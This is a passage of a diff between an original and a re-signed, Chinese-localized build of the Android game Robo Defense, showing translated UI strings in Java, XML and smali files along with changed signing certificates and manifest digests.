+>     paramSharedPreferences = new RewardProp("解锁地雷炮塔", 500000, paramSharedPreferences);
+133c133
+<     paramSharedPreferences.description_prefix = "Mines deal a large amount of damage when stepped on";
+---
+>     paramSharedPreferences.description_prefix = "增加踩到地雷时的伤害";
+175c175
+<       return "power lvl " + rewardLevel(paramInt) + " (+" + rewardFactor(paramInt) + ")";
+---
+>       return "攻击等级 " + rewardLevel(paramInt) + " (+" + rewardFactor(paramInt) + ")";
+177c177
+<       return "speed lvl " + rewardLevel(paramInt) + " (+" + rewardFactor(paramInt) + "%)";
+---
+>       return "速度等级 " + rewardLevel(paramInt) + " (+" + rewardFactor(paramInt) + "%)";
+179c179
+<       return "effect lvl " + rewardLevel(paramInt) + " (+" + rewardFactor(paramInt) + "%)";
+---
+>       return "效果等级 " + rewardLevel(paramInt) + " (+" + rewardFactor(paramInt) + "%)";
+181c181
+<       return "power lvl " + rewardLevel(paramInt) + " (+" + rewardFactor(paramInt) + "%)";
+---
+>       return "攻击等级 " + rewardLevel(paramInt) + " (+" + rewardFactor(paramInt) + "%)";
+diff -r result/APP_35/App_B_35/com/magicwach/rdefense/ScoreOverlay.java result/APP_35/App_M_35/com/magicwach/rdefense/ScoreOverlay.java
+90c90
+<         n = drawLine(paramCanvas, paramPaint, i1, "Score:", add_string);
+---
+>         n = drawLine(paramCanvas, paramPaint, i1, "得分:", add_string);
+97c97
+<           i1 = drawLine(paramCanvas, paramPaint, n, "Victory Bonus:", won_string);
+---
+>           i1 = drawLine(paramCanvas, paramPaint, n, "胜利奖金:", won_string);
+113c113
+<           i1 = drawLine(paramCanvas, paramPaint, n, "Remaining Money Bonus:", money_string);
+---
+>           i1 = drawLine(paramCanvas, paramPaint, n, "剩余奖金:", money_string);
+117c117
+<       for (n = drawLine(paramCanvas, paramPaint, i1, "Perfect Game Bonus:", perfect_string);; n = i1)
+---
+>       for (n = drawLine(paramCanvas, paramPaint, i1, "完成游戏奖金:", perfect_string);; n = i1)
+125c125
+<           drawLine(paramCanvas, paramPaint, n, "Earned Reward Points", total_string);
+---
+>           drawLine(paramCanvas, paramPaint, n, "获得奖励点数", total_string);
+diff -r result/APP_35/App_B_35/com/magicwach/rdefense/TitleActivity.java result/APP_35/App_M_35/com/magicwach/rdefense/TitleActivity.java
+328c328
+<     return "Reward Points Earned: " + i;
+---
+>     return "奖励点数: " + i;
+diff -r result/APP_35/App_B_35/com/magicwach/rdefense/TowerData.java result/APP_35/App_M_35/com/magicwach/rdefense/TowerData.java
+93c93
+<     localTowerProp.label = "Sell For Cash";
+---
+>     localTowerProp.label = "出售";
+118c118
+<       localTowerProp.label = "Medium Gun";
+---
+>       localTowerProp.label = "中级炮";
+133c133
+<       localTowerProp.label = "Heavy Gun";
+---
+>       localTowerProp.label = "重炮";
+150c150
+<       localTowerProp.label = "Antiair Cannon";
+---
+>       localTowerProp.label = "对空炮";
+166c166
+<       localTowerProp.label = "Heavy Antiair Cannon";
+---
+>       localTowerProp.label = "重型对空炮";
+182c182
+<       localTowerProp.label = "Flame Tower";
+---
+>       localTowerProp.label = "火焰炮塔";
+197c197
+<       localTowerProp.label = "Inferno Tower";
+---
+>       localTowerProp.label = "火海炮塔";
+220c220
+<       localTowerProp.label = "Basic Slow Tower";
+---
+>       localTowerProp.label = "初级减速炮塔";
+238c238
+<       localTowerProp.label = "Upgraded Slow Tower";
+---
+>       localTowerProp.label = "升级减速炮塔";
+255c255
+<       localTowerProp.label = "Advanced Slow Tower";
+---
+>       localTowerProp.label = "高级减速炮塔";
+272c272
+<       localTowerProp.label = "Light Rocket Launcher";
+---
+>       localTowerProp.label = "轻型火箭炮塔";
+289c289
+<       localTowerProp.label = "Medium Rocket Launcher";
+---
+>       localTowerProp.label = "中型火箭炮塔";
+305c305
+<       localTowerProp.label = "Heavy Rocket Launcher";
+---
+>       localTowerProp.label = "重型火箭炮塔";
+322c322
+<       localTowerProp.label = "Surface to Air Missile";
+---
+>       localTowerProp.label = "地对空导弹炮塔";
+338c338
+<       localTowerProp.label = "Adv Surface to Air Missile";
+---
+>       localTowerProp.label = "高级地对空导弹炮塔";
+356c356
+<       localTowerProp.label = "Mortar";
+---
+>       localTowerProp.label = "迫击炮炮塔";
+373c373
+<       localTowerProp.label = "Artillery";
+---
+>       localTowerProp.label = "火炮炮台";
+390c390
+<       localTowerProp.label = "Unarmed Teleport Tower";
+---
+>       localTowerProp.label = "无攻击力传送炮塔";
+409c409
+<       localTowerProp.label = "Armed Teleport Tower";
+---
+>       localTowerProp.label = "武装的传送炮塔";
+424c424
+<       localTowerProp.label = "Unarmed Mine";
+---
+>       localTowerProp.label = "无攻击力的地雷";
+442c442
+<       localTowerProp.label = "Armed Mine";
+---
+>       localTowerProp.label = "待发雷";
+diff -r result/APP_35/App_B_35/com/magicwach/rdefense/UpgradeButton.java result/APP_35/App_M_35/com/magicwach/rdefense/UpgradeButton.java
+185c185
+<     this.message = ("Sell for $" + paramInt);
+---
+>     this.message = ("出售 $" + paramInt);
+Somente em result/APP_35/App_M_35/com: xxx
+Os arquivos binários result/APP_35/App_B_35/original/AndroidManifest.xml e result/APP_35/App_M_35/original/AndroidManifest.xml são diferentes
+Somente em result/APP_35/App_M_35/original/META-INF: CERT.RSA
+Somente em result/APP_35/App_M_35/original/META-INF: CERT.SF
+Somente em result/APP_35/App_B_35/original/META-INF: MAGICWAC.DSA
+Somente em result/APP_35/App_B_35/original/META-INF: MAGICWAC.SF
+diff -r result/APP_35/App_B_35/original/META-INF/MANIFEST.MF result/APP_35/App_M_35/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.6.0_0 (Sun Microsystems Inc.)
+---
+> Created-By: 1.0 (Android SignApk)
+17c17
+< SHA1-Digest: gGEsb+Q9etgVf7iX+wedm+X54i8=
+---
+> SHA1-Digest: mz/iZy6vNihClQTsyqgKDcBOIJw=
+23c23
+< SHA1-Digest: 9Pc3aWALRuBQvS17dXDNAynNVJQ=
+---
+> SHA1-Digest: 6wKcMI5MkTtBPEOYFNhqDMwN78c=
+29c29
+< SHA1-Digest: Gw8toOvI8UqjxLrYKJzcnJyAO5A=
+---
+> SHA1-Digest: v42GfWRKt69PmvuwuSs+ZXd9OA0=
+32c32
+< SHA1-Digest: AEYBmHhkzTr+70toDjg011G3drE=
+---
+> SHA1-Digest: zTVZtKWeNBifJ3M0MTSx4FSOaMU=
+47c47
+< SHA1-Digest: Xdc1S3T630IxwJ4pkQbFKpKuSUI=
+---
+> SHA1-Digest: aipZ3Cx5jNS/X+ZoiSWET+Kh2Qg=
+68c68
+< SHA1-Digest: TUwdbvAVUFRTDUTyHgWvP6nyG0U=
+---
+> SHA1-Digest: Fe9m1utsVTfbbL2CGfNT/JStYR0=
+71c71
+< SHA1-Digest: VxgSUdA3ZfUzHsGsKczj7VjlMeo=
+---
+> SHA1-Digest: s5kgDiy6E0GdaNMPantjK3EEazA=
+92c92
+< SHA1-Digest: SZS4ZAnvSgV5tDJaH3YlBkgMxns=
+---
+> SHA1-Digest: A27fCMVch8196dd4J8GY8XyU8ys=
+110c110
+< SHA1-Digest: rZVv2Akr0EEvX72sr/6zuvZRAIA=
+---
+> SHA1-Digest: cAR6AyNxhSULWXZzFKYObPjRwB0=
+119c119
+< SHA1-Digest: frS6KVqyIhwjYBRwJw8lS5jUix4=
+---
+> SHA1-Digest: thWnpUCG9MlHj9oPQ23EN0Tyr9g=
+137c137
+< SHA1-Digest: 895zjZnBszgue8t89FvvQ8doEIQ=
+---
+> SHA1-Digest: sjy3p+apmS9HvLHlQtXVkZfgAks=
+149c149
+< SHA1-Digest: nEjdHzdjlKumfgKgR2OdR0QWwZU=
+---
+> SHA1-Digest: QHCbRvl69/vCItdglqL3GtuHqzE=
+152c152
+< SHA1-Digest: G+cle8quWuYJjvVphgqTUb6Tddc=
+---
+> SHA1-Digest: bJSGwAJj0LHNr4iVV3t83vCR1Mo=
+182c182
+< SHA1-Digest: 6odmYB/7+GuyKZPexgAbnqHA2fk=
+---
+> SHA1-Digest: m79Q3XiZMotDj/3mxaZs7G4+s64=
+191c191
+< SHA1-Digest: WcThxoP3DGYRxzvt8DdCZaVE+Ro=
+---
+> SHA1-Digest: djtVQMw7ujKaCI/g6sZInuQlVbs=
+Os arquivos binários result/APP_35/App_B_35/res/drawable/achievement_earned.png e result/APP_35/App_M_35/res/drawable/achievement_earned.png são diferentes
+Os arquivos binários result/APP_35/App_B_35/res/drawable/achievement_pending.png e result/APP_35/App_M_35/res/drawable/achievement_pending.png são diferentes
+Os arquivos binários result/APP_35/App_B_35/res/drawable/alert_dialog_icon.png e result/APP_35/App_M_35/res/drawable/alert_dialog_icon.png são diferentes
+Os arquivos binários result/APP_35/App_B_35/res/drawable/down_arrow.png e result/APP_35/App_M_35/res/drawable/down_arrow.png são diferentes
+Os arquivos binários result/APP_35/App_B_35/res/drawable/heart.png e result/APP_35/App_M_35/res/drawable/heart.png são diferentes
+Os arquivos binários result/APP_35/App_B_35/res/drawable/up_arrow.png e result/APP_35/App_M_35/res/drawable/up_arrow.png são diferentes
+diff -r result/APP_35/App_B_35/res/layout/credits.xml result/APP_35/App_M_35/res/layout/credits.xml
+4c4
+<     <TextView android:textSize="10.0pt" android:layout_gravity="center" android:id="@id/credits_title" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Credits" />
+---
+>     <TextView android:textSize="10.0pt" android:layout_gravity="center" android:id="@id/credits_title" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="致谢" />
+diff -r result/APP_35/App_B_35/res/layout/level_select.xml result/APP_35/App_M_35/res/layout/level_select.xml
+4,5c4,5
+<     <TextView android:textSize="8.0pt" android:layout_gravity="center" android:id="@id/level_title" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginTop="5.0pt" android:text="Select Difficulty Level" />
+<     <TextView android:textSize="6.0pt" android:layout_gravity="center" android:id="@id/level_msg" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="The max difficulty in the FREE version is 10" />
+---
+>     <TextView android:textSize="8.0pt" android:layout_gravity="center" android:id="@id/level_title" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginTop="5.0pt" android:text="选择难度等级" />
+>     <TextView android:textSize="6.0pt" android:layout_gravity="center" android:id="@id/level_msg" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="免费版本的最大难度等级为10" />
+8c8
+<         <TextView android:textSize="14.0pt" android:layout_gravity="center" android:id="@id/level_text" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Level 0" />
+---
+>         <TextView android:textSize="14.0pt" android:layout_gravity="center" android:id="@id/level_text" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="等级 0" />
+11c11
+<     <TextView android:textSize="8.0pt" android:layout_gravity="center" android:id="@id/map_title" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginTop="5.0pt" android:text="Select Map" />
+---
+>     <TextView android:textSize="8.0pt" android:layout_gravity="center" android:id="@id/map_title" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginTop="5.0pt" android:text="选择地图" />
+14c14
+<         <TextView android:textSize="14.0pt" android:layout_gravity="center" android:id="@id/map_text" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Basic Map" />
+---
+>         <TextView android:textSize="14.0pt" android:layout_gravity="center" android:id="@id/map_text" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="基本地图" />
+diff -r result/APP_35/App_B_35/res/layout/mixer_select.xml result/APP_35/App_M_35/res/layout/mixer_select.xml
+4,5c4,5
+<     <TextView android:textSize="8.0pt" android:layout_gravity="center" android:id="@id/mixer_title" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginTop="5.0pt" android:text="Enter Any Map Code" />
+<     <TextView android:textSize="6.0pt" android:layout_gravity="center" android:id="@id/mixer_msg" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Or hit 'Randomize' for a random code" />
+---
+>     <TextView android:textSize="8.0pt" android:layout_gravity="center" android:id="@id/mixer_title" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginTop="5.0pt" android:text="输入任意地图码" />
+>     <TextView android:textSize="6.0pt" android:layout_gravity="center" android:id="@id/mixer_msg" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="或点击 '随机' 获得随机码" />
+diff -r result/APP_35/App_B_35/res/layout/options.xml result/APP_35/App_M_35/res/layout/options.xml
+4c4
+<     <TextView android:textSize="10.0pt" android:layout_gravity="center" android:id="@id/option_title" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Options" />
+---
+>     <TextView android:textSize="10.0pt" android:layout_gravity="center" android:id="@id/option_title" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="选项" />
+10c10
+<             <Button android:id="@id/save_options" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Save Options" android:layout_weight="1.0" />
+---
+>             <Button android:id="@id/save_options" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="保存选项" android:layout_weight="1.0" />
+diff -r result/APP_35/App_B_35/res/layout/rewards.xml result/APP_35/App_M_35/res/layout/rewards.xml
+4,5c4,5
+<     <TextView android:textSize="10.0pt" android:layout_gravity="center" android:id="@id/reward_title" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="You Have 0 Reward Points" />
+<     <TextView android:layout_gravity="center" android:id="@id/reward_description" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginBottom="5.0pt" android:text="Collect reward points by playing the game!" />
+---
+>     <TextView android:textSize="10.0pt" android:layout_gravity="center" android:id="@id/reward_title" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="你有 0 奖励积分" />
+>     <TextView android:layout_gravity="center" android:id="@id/reward_description" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginBottom="5.0pt" android:text="通过玩游戏赚取奖励积分!" />
+diff -r result/APP_35/App_B_35/res/values/strings.xml result/APP_35/App_M_35/res/values/strings.xml
+3,20c3,20
+<     <string name="app_name">Robo Defense</string>
+<     <string name="exit_to_title">Exit To Title</string>
+<     <string name="options">Options</string>
+<     <string name="save_and_quit">Save And Quit</string>
+<     <string name="new_game">New Game</string>
+<     <string name="resume_saved_game">Resume Saved Game</string>
+<     <string name="title_str">Welcome To Robo Defense</string>
+<     <string name="achievements">View Achievements</string>
+<     <string name="rewards">Spend Reward Points</string>
+<     <string name="credits">Credits</string>
+<     <string name="exit_game">Exit Game</string>
+<     <string name="save_exists_dialog_title">Discard Saved Game And Start Over?</string>
+<     <string name="yes">Yes</string>
+<     <string name="cancel">Cancel</string>
+<     <string name="go_back">Go Back</string>
+<     <string name="start_game">Start Game!</string>
+<     <string name="sound_enabled">Enable Sound Effects</string>
+<     <string name="sound_credits_top">Robo Defense uses the following sound files from Freesound</string>
+---
+>     <string name="app_name">机器人塔防</string>
+>     <string name="exit_to_title">退出并返回到游戏主界面</string>
+>     <string name="options">选项</string>
+>     <string name="save_and_quit">保存并退出</string>
+>     <string name="new_game">新游戏</string>
+>     <string name="resume_saved_game">继续已保存的游戏</string>
+>     <string name="title_str">欢迎来到机器人塔防</string>
+>     <string name="achievements">查看成就</string>
+>     <string name="rewards">消费奖赏点数</string>
+>     <string name="credits">致谢</string>
+>     <string name="exit_game">退出游戏</string>
+>     <string name="save_exists_dialog_title">放弃已保存的游戏重新开始?</string>
+>     <string name="yes">是</string>
+>     <string name="cancel">取消</string>
+>     <string name="go_back">返回</string>
+>     <string name="start_game">开始游戏!</string>
+>     <string name="sound_enabled">开用音效</string>
+>     <string name="sound_credits_top">游戏从 Freesound 使用下列声音文件</string>
+22,26c22,27
+<     <string name="sound_credits_list">"fire crackling from dobroide
+< military exercise from juskiddink
+< heavy burst from alienbomb
+< rocket from nthompson
+< swoophoversplit3 from ignotus
+---
+>     <string name="sound_credits_list">"火焰声来自 dobroide
+> 军事运用来自 juskiddink
+> 重型爆裂来自 alienbomb
+> 火箭来自 nthompson
+> swoophoversplit3 来自 ignotus
+> 安卓网汉化组 www.hiapk.com 
+29c30
+<     <string name="randomize">Randomize</string>
+---
+>     <string name="randomize">随机选择</string>
+diff -r result/APP_35/App_B_35/smali/com/magicwach/rdefense/AchievementActivity.smali result/APP_35/App_M_35/smali/com/magicwach/rdefense/AchievementActivity.smali
+200c200
+<     const-string v3, "You Have "
+---
+>     const-string v3, "\u60a8\u6709"
+208c208
+<     const-string v3, " Achievement Point"
+---
+>     const-string v3, " \u6210\u5c31\u70b9"
+218c218
+<     const-string v3, "s"
+---
+>     const-string v3, ""
+406c406
+<     const-string v2, "Each achievement you unlock adds to your in-game bonus!"
+---
+>     const-string v2, " \u60a8\u5f00\u542f\u7684\u6bcf\u4e2a\u6210\u5c31\u5c06\u6dfb\u52a0\u5230\u4f60\u7684\u6e38\u620f\u7684\u5956\u91d1\u4e2d\uff01"
+diff -r result/APP_35/App_B_35/smali/com/magicwach/rdefense/AchievementAlert.smali result/APP_35/App_M_35/smali/com/magicwach/rdefense/AchievementAlert.smali
+802c802
+<     const-string v0, "Achievement Earned:"
+---
+>     const-string v0, "\u6323\u5f97\u7684\u6210\u5c31:"
+diff -r result/APP_35/App_B_35/smali/com/magicwach/rdefense/AchievementData.smali result/APP_35/App_M_35/smali/com/magicwach/rdefense/AchievementData.smali
+313c313
+<     const-string v1, "Complete Any Map"
+---
+>     const-string v1, "\u5b8c\u6210\u4efb\u610f\u5730\u56fe"
+324c324
+<     const-string v1, "Finish any map"
+---
+>     const-string v1, "\u5b8c\u6210\u4efb\u610f\u5730\u56fe"
+332c332
+<     const-string v1, "Complete Difficulty 2"
+---
+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7b49\u7ea7 2"
+343c343
+<     const-string v1, "Finish a map with the difficulty level set to 2 or more"
+---
+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7ea7\u522b\u4e3a 2 \u6216\u66f4\u9ad8\u7684\u5730\u56fe"
+351c351
+<     const-string v1, "Complete Difficulty 5"
+---
+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7b49\u7ea7 5"
+364c364
+<     const-string v1, "Finish a map with the difficulty level set to 5 or more"
+---
+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7ea7\u522b\u4e3a 5 \u6216\u66f4\u9ad8\u7684\u5730\u56fe"
+372c372
+<     const-string v1, "Complete Difficulty 8"
+---
+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7b49\u7ea7 8"
+385c385
+<     const-string v1, "Finish a map with the difficulty level set to 8 or more"
+---
+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7ea7\u522b\u4e3a 8 \u6216\u66f4\u9ad8\u7684\u5730\u56fe"
+393c393
+<     const-string v1, "Complete Difficulty 11"
+---
+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7b49\u7ea7 11"
+406c406
+<     const-string v1, "Finish a map with the difficulty level set to 11 or more"
+---
+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7ea7\u522b\u4e3a 11 \u6216\u66f4\u9ad8\u7684\u5730\u56fe"
+414c414
+<     const-string v1, "Complete Difficulty 14"
+---
+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7b49\u7ea7 14"
+425c425
+<     const-string v1, "Finish a map with the difficulty level set to 14 or more"
+---
+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7ea7\u522b\u4e3a 14 \u6216\u66f4\u9ad8\u7684\u5730\u56fe"
+433c433
+<     const-string v1, "Complete Difficulty 17"
+---
+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7b49\u7ea7 17"
+446c446
+<     const-string v1, "Finish a map with the difficulty level set to 17 or more"
+---
+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7ea7\u522b\u4e3a 17 \u6216\u66f4\u9ad8\u7684\u5730\u56fe"
+454c454
+<     const-string v1, "Complete Difficulty 20"
+---
+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7b49\u7ea7 20"
+467c467
+<     const-string v1, "Finish a map with the difficulty level set to 20"
+---
+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7ea7\u522b\u4e3a 20 \u6216\u66f4\u9ad8\u7684\u5730\u56fe"
+475c475
+<     const-string v1, "Perfect 25"
+---
+>     const-string v1, "\u5b8c\u6210 25"
+488c488
+<     const-string v1, "Get Level bonus to 25"
+---
+>     const-string v1, "\u83b7\u5f97\u7b49\u7ea7\u5956\u91d1 25"
+496c496
+<     const-string v1, "Perfect 50"
+---
+>     const-string v1, "\u5b8c\u6210 50"
+509c509
+<     const-string v1, "Get Level bonus to 50"
+---
+>     const-string v1, "\u83b7\u5f97\u7b49\u7ea7\u5956\u91d1 50"
+517c517
+<     const-string v1, "Perfect 100"
+---
+>     const-string v1, "\u5b8c\u6210 100"
+528c528
+<     const-string v1, "Finish a map without losing any health"
+---
+>     const-string v1, "\u5b8c\u6210\u4efb\u610f\u5730\u56fe\uff0c\u800c\u4e0d\u51cf\u5c11\u751f\u547d\u503c"
+536c536
+<     const-string v1, "Fast-Paced"
+---
+>     const-string v1, "\u5feb\u8282\u594f"
+549c549
+<     const-string v1, "Finish a map without creating any slow towers"
+---
+>     const-string v1, "\u5b8c\u6210\u4e00\u5f20\u6ca1\u6709\u4ea7\u751f\u51cf\u901f\u6162\u5854\u7684\u5730\u56fe"
+557c557
+<     const-string v1, "Rocketman"
+---
+>     const-string v1, "\u706b\u7bad\u4eba"
+570c570
+<     const-string v1, "Finish a map without creating any gun towers"
+---
+>     const-string v1, "\u5b8c\u6210\u4e00\u4e2a\u6ca1\u6709\u4ea7\u751f\u4efb\u4f55\u67aa\u5854\u7684\u5730\u56fe"
+578c578
+<     const-string v1, "Gunner"
+---
+>     const-string v1, "\u70ae\u624b"
+591c591
+<     const-string v1, "Finish a map without creating any rocket towers"
+---
+>     const-string v1, "\u5b8c\u6210\u4e00\u4e2a\u6ca1\u6709\u4ea7\u751f\u4efb\u4f55\u706b\u7bad\u5854\u5730\u56fe"
+599c599
+<     const-string v1, "Cheapskate"
+---
+>     const-string v1, "\u541d\u556c\u9b3c"
+612c612
+<     const-string v1, "Finish a map without upgrading any towers"
+---
+>     const-string v1, "\u5b8c\u6210\u4e00\u5f20\u5730\u56fe\u6ca1\u6709\u5347\u7ea7\u4efb\u4f55\u70ae\u5854"
+620c620
+<     const-string v1, "Big Spender"
+---
+>     const-string v1, "\u5927\u5bcc\u8c6a"
+633c633
+<     const-string v1, "Finish a map with all towers fully-upgraded"
+---
+>     const-string v1, "\u5b8c\u6210\u5730\u56fe\u4e0a\u6240\u6709\u70ae\u5854\u5347\u7ea7"
+641c641
+<     const-string v1, "25K Club"
+---
+>     const-string v1, "25K \u4ff1\u4e50\u90e8"
+656c656
+<     const-string v1, "Defeat 25K enemies"
+---
+>     const-string v1, "\u6218\u80dc 25K \u654c\u4eba"
+664c664
+<     const-string v1, "Big Score"
+---
+>     const-string v1, "\u5927\u5206\u6570"
+679c679
+<     const-string v1, "Score 1,000,000 lifetime points"
+---
+>     const-string v1, "\u5f97\u5230 1,000,000 \u751f\u547d\u70b9"
+687c687
+<     const-string v1, "Huge Score"
+---
+>     const-string v1, "\u5de8\u5927\u7684\u5206\u6570"
+702c702
+<     const-string v1, "Score 50,000,000 lifetime points"
+---
+>     const-string v1, "\u5f97\u5230 5,000,000 \u751f\u547d\u70b9"
+710c710
+<     const-string v1, "Experienced"
+---
+>     const-string v1, "\u6709\u7ecf\u9a8c\u7684"
+725c725
+<     const-string v1, "Finish 1000 levels"
+---
+>     const-string v1, "\u5b8c\u6210 1000 \u7b49\u7ea7"
+733c733
+<     const-string v1, "Powered up"
+---
+>     const-string v1, "\u529b\u91cf\u5347\u7ea7"
+746c746
+<     const-string v1, "Finish a map with 12 or fewer towers"
+---
+>     const-string v1, "\u4ee5 12 \u4e2a\u6216\u66f4\u5c11\u7684\u5854\u5b8c\u6210\u5730\u56fe"
+754c754
+<     const-string v1, "No Sale"
+---
+>     const-string v1, "\u65e0\u51fa\u552e"
+767c767
+<     const-string v1, "Finish a map without selling a tower"
+---
+>     const-string v1, "\u5b8c\u6210\u5730\u56fe\u800c\u6ca1\u6709\u51fa\u552e\u70ae\u5854"
+775c775
+<     const-string v1, "Fast Lane"
+---
+>     const-string v1, "\u5feb\u901f\u9053"
+788c788
+<     const-string v1, "Finish at least 75 levels with fast-forward turned on during a game"
+---
+>     const-string v1, "\u5728\u6e38\u620f\u4e2d\u4ee5\u5feb\u8fdb\u6253\u5f00\uff0c\u5b8c\u6210\u81f3\u5c11 75 \u7ea7"
+796c796
+<     const-string v1, "Addict"
+---
+>     const-string v1, "\u4e0a\u763e\u8005"
+811c811
+<     const-string v1, "Finish 5000 levels"
+---
+>     const-string v1, "\u5b8c\u6210 5000 \u7b49\u7ea7"
+819c819
+<     const-string v1, "75K Club"
+---
+>     const-string v1, "75K \u4ff1\u4e50\u90e8"
+834c834
+<     const-string v1, "Defeat 75K enemies"
+---
+>     const-string v1, "\u51fb\u8d25 75K \u654c\u4eba"
+842c842
+<     const-string v1, "Risk Taker"
+---
+>     const-string v1, "\u5192\u9669\u8005"
+853c853
+<     const-string v1, "Finish a map with 1 health remaining"
+---
+>     const-string v1, "\u5b8c\u6210\u5730\u56fe\uff0c\u5269\u4f59 1 \u751f\u547d\u503c"
+861c861
+<     const-string v1, "Solid Effort"
+---
+>     const-string v1, "\u575a\u5b9e\u7684\u6210\u5c31"
+874c874
+<     const-string v1, "Finish a map with at least 18 health"
+---
+>     const-string v1, "\u7528\u81f3\u5c11 18 \u751f\u547d\u503c\u5b8c\u6210\u5730\u56fe"
+882c882
+<     const-string v1, "Rainy Day"
+---
+>     const-string v1, "\u7a77\u56f0\u671f"
+895c895
+<     const-string v1, "Collect $1000 during a game"
+---
+>     const-string v1, "\u5728\u6e38\u620f\u4e2d\u6536\u96c6 $1000"
+903c903
+<     const-string v1, "Big Saver"
+---
+>     const-string v1, "\u5927\u50a8\u84c4\u8005"
+916c916
+<     const-string v1, "Collect $2500 during a game"
+---
+>     const-string v1, "\u5728\u6e38\u620f\u4e2d\u6536\u96c6 $2500"
+924c924
+<     const-string v1, "Crazy Saver"
+---
+>     const-string v1, "\u75af\u72c2\u7684\u50a8\u84c4\u8005"
+937c937
+<     const-string v1, "Collect $5000 during a game"
+---
+>     const-string v1, "\u5728\u6e38\u620f\u4e2d\u6536\u96c6$5000"
+945c945
+<     const-string v1, "Big One"
+---
+>     const-string v1, "\u5927\u5bb6\u4f19"
+958c958
+<     const-string v1, "Earn 500+ points from a single enemy"
+---
+>     const-string v1, "\u4ece\u5355\u72ec\u4e00\u4e2a\u654c\u4eba\u8eab\u4e0a\u8d5a\u5230500+ \u70b9"
+966c966
+<     const-string v1, "Whopper"
+---
+>     const-string v1, "\u7855\u5927\u7684\u7269\u4f53"
+979c979
+<     const-string v1, "Earn 1000+ points from a single enemy"
+---
+>     const-string v1, "\u4ece\u5355\u4e00\u7684\u654c\u4eba\u8d5a1000 +\u70b9"
+987c987
+<     const-string v1, "Good Game"
+---
+>     const-string v1, "\u7cbe\u5f69\u7684\u6bd4\u8d5b"
+1000c1000
+<     const-string v1, "Earn 250000+ points during a game"
+---
+>     const-string v1, "\u5728\u6e38\u620f\u4e2d\u8d5a\u53d6 250000+ \u70b9\u6570"
+1008c1008
+<     const-string v1, "Great Game"
+---
+>     const-string v1, "\u5927\u6e38\u620f"
+1021c1021
+<     const-string v1, "Earn 500000+ points during a game"
+---
+>     const-string v1, "\u5728\u6e38\u620f\u4e2d\u8d5a\u53d6 500000+ \u70b9\u6570"
+1029c1029
+<     const-string v1, "Amazing Game"
+---
+>     const-string v1, "\u523a\u6fc0\u7684\u6e38\u620f"
+1042c1042
+<     const-string v1, "Earn 1000000+ points during a game"
+---
+>     const-string v1, "\u5728\u6e38\u620f\u4e2d\u8d5a\u53d61000000 +\u70b9"
+1050c1050
+<     const-string v1, "Basic 10"
+---
+>     const-string v1, "\u521d\u7ea7 10"
+1063c1063
+<     const-string v1, "Finish the Basic level 10 times"
+---
+>     const-string v1, "\u5b8c\u6210\u521d\u7ea7 10 \u6b21"
+1071c1071
+<     const-string v1, "Basic 25"
+---
+>     const-string v1, "\u521d\u7ea7 25"
+1084c1084
+<     const-string v1, "Finish the Basic level 25 times"
+---
+>     const-string v1, "\u5b8c\u6210\u521d\u7ea7 25 \u6b21"
+1092c1092
+<     const-string v1, "Basic level 40"
+---
+>     const-string v1, "\u521d\u7ea7 40"
+1105c1105
+<     const-string v1, "Finish the Basic level at difficulty level 40"
+---
+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7ea7\u522b\u4e3a 40 \u7684\u521d\u7ea7"
+1113c1113
+<     const-string v1, "Basic level 60"
+---
+>     const-string v1, "\u521d\u7ea7 60"
+1126c1126
+<     const-string v1, "Finish the Basic level at difficulty level 60"
+---
+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7ea7\u522b\u4e3a 60 \u7684\u521d\u7ea7"
+1134c1134
+<     const-string v1, "Ruins 10"
+---
+>     const-string v1, "\u5e9f\u589f 10"
+1147c1147
+<     const-string v1, "Finish the the Ruins 10 times"
+---
+>     const-string v1, "\u5b8c\u6210\u5e9f\u589f 10 \u6b21"
+1155c1155
+<     const-string v1, "Ruins 25"
+---
+>     const-string v1, "\u5e9f\u589f 25"
+1168c1168
+<     const-string v1, "Finish the the Ruins 25 times"
+---
+>     const-string v1, "\u5b8c\u6210\u5e9f\u589f 25 \u6b21"
+1176c1176
+<     const-string v1, "The Ruins level 30"
+---
+>     const-string v1, "30\u7ea7 \u5e9f\u589f"
+1189c1189
+<     const-string v1, "Finish the the Ruins at difficulty level 30"
+---
